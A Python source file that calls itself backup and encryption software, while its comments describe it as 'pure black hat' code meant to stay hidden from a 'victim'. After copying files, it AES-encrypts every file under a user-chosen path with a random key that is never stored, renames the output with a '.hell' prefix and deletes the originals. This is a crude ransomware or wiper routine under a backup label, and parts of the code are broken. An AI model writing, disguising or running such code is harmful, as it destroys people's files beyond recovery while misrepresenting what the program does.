#!/usr/bin/python
# -*- coding: utf-8 -*-

# This is a backup and crytp/desencrypt software

# written in pure python and usual libs
# BORN TO CODE 

# MELHORIAS SÃO BEM VINDAS.
# ISSO É UM ESQUELETO.
# @mrx6SO

# Visit: https://github.com/mrx6SO/

# madrugada é para codar. Entre outras coisas....
#
#
# the world is a secure place, trust in this...
# educational porpuoses only. for sure. 

# this is pure black hat, and how to defend ourself of this kinda of attack...

# the code will be intuitive to the attacker and hidden to  the 'victim'. If correctly adapted... 

# flying_bird.py flying like a bird 
# lol

# tryng some py2exe 
# or some fisic acess
# or do it in your lab : - )

# i don't care... really 

# echo 
# echo
# echo $LetsMoveOnKiddon$


# so, the first thing is import the modules.
# all knowllegd for us. 
# so, lets move on, kiddon - Mr Robot referencie. in the case of someone don't know.lol 


# those libs are avaiable for windows too
# i forget the name...other time i'll fix it...

from Crypto.Hash import SHA256
from Crypto.Cipher import AES

# basic libs

import os
import random
import sys
import pkg_resources

import re # to check the files
import shutil # for the copu
import time # delay between execution of functions
import easygui # for GUI stuffs
import string # for the password method 

#def find_files(pattern, path):

# function to find the files

# função para encontrar os arquivos

def find_files(pattern, path):

    for path, dirs, files in os.walk(path):

        for fname in files:

            full_file_name = os.path.join(path, fname) # join into path and all files
            
            match = re.match(pattern, full_file_name) # check if the file has a matched pattern 

            if(match): # conditional for the match

                yield full_file_name # will save that untill next return. 


#function that copy matched files for the destination path / pendrive / email

# função responsável pela cópia dos arquivos compatíveis para pasta / pendrive/ email selecionados

def copy_files(pattern, src_path, dest_path): 

    """
        function receive 3 arguments:
        
        - pattern of files : '.'
        - src_path = 'source path', where files are located
        - dest_path = 'destination path', where the files will be copied
        
    """

    for full_file_name in find_files(pattern,src_path): # here the yield will be called 

        print(full_file_name) + ' file was copied into ' + (dest_path) 

        try: 
           
            shutil.copy(full_file_name, dest_path) # made the copy of files into defined path

        except IOError: # in case of some error of input/output

            return # return to function 

# set up criptography - i choice for AES         

# defina a criptografia - optei pela AES

def encrypt(key, filename):
    
        chunksize = 64 * 1024
        outFile = os.path.join(os.path.dirname(filename), '.hell'+os.path.basename(filename))
        filesize = str(os.path.getsize(filename)).zfill(16)

        IV = ''
 
        for i in range(16):
                IV += chr(random.randint(0, 0xFF))
       
        encryptor = AES.new(key, AES.MODE_CBC, IV)
 
        with open(filename, 'rb') as infile:
                with open(outFile, 'wb') as outfile:
                        outfile.write(filesize)
                        outfile.write(IV)

                        while True:

                                chunk = infile.read(chunksize)
                               
                                if len(chunk) == 0:
                                        break
 
                                elif len(chunk) % 16 !=0:
                                        chunk += ' ' *  (16 - (len(chunk) % 16))
 
                                outfile.write(encryptor.encrypt(chunk))
                                
                        
# append the files found on the current directory

def allfiles(path):

        allFiles = []
        
        for root, subfiles, files in os.walk(path):
                for names in files:
                        allFiles.append(os.path.join(root, names))
 
        return allFiles
    
# key to guarantee singularity in the functions

def generated_key(size):

    caracters = '~{}^=+()@#$%*¨\/[]&ABCDEFGHIJKLMNOPQRSTUVXZY0123456789abcdefghijlmnopqrstuwvxz0123456789'
    ps = ''

    for char in xrange(size):

        ps += random.choice(caracters)

    return ps


def done_crypt():

    #easygui.msgbox('Crypting system')

    choice = True
    #choice = raw_input("Do you want to (E)ncrypt or (D)ecrypt? ")
    
    encfiles = easygui.enterbox("Choise the path to encrypt")
    allfiles(encfiles)
    encFiles = allfiles(encfiles)
    #(allfiles('C:\\teste')
    key = generated_key(16)

    #password = generated_key(16)

    if(choice):

        for Tfiles in encFiles:

            if os.path.basename(Tfiles).startswith(".hell"):

                print("%s is already encrypted") %str(Tfiles)

                pass
 
            elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):

                pass

            else:

                encrypt(SHA256.new(key).digest(), str(Tfiles))

                print("Done encrypting %s") %str(Tfiles)
                
                os.remove(Tfiles)
 
def done_cp():

    #while True:

     #   try:
           
    patt = '.' #the pattern
       
    if(os.name == 'nt'): # if system is Windows based

           # """

            #   select the source to do the copy
             #  select destination path that will receive the previously copyed files

              # :    the pattern is '.' cause it gets all the extensions
              #      if is needed set up one or many different extension
               #:    just modify the part of code that handle with it

            #"""  

        #print('source path must be, for ex. | C:\\Users | with 2 slashs.')
            #src = raw_input('Source path: ')
            #dst = raw_input('Destination path: ')
              
       # easygui.msgbox('Smooth Backup  Encrypt and desencrypt')
        
        src = easygui.enterbox('Source')
        dst = easygui.enterbox('Destination')

        copy_files(patt, src, dst)
        time.sleep(1)

    elif(os.name == 'posix'): # if it's Unix systems
                              # se for sistemas Unix 
            
            #srce = raw_input('Source path: ')
            #destin = raw_input('Destination path: ')
        
        #easygui.msgbox('Smooth Baackup')
        
        srce = easygui.enterbox('Source: ')
        destin = easygui.enterbox('Destination: ')

        copy_files(patt, srce, destin)
        time.sleep(2)

    else:

        pass
    
# calling the functions... simple way...

def main():

    while True:

        try:

            done_cp()

        except:

            pass

        try:
                
            done_crypt()

        except:

            break
            
    
if __name__ == "__main__":

    main()
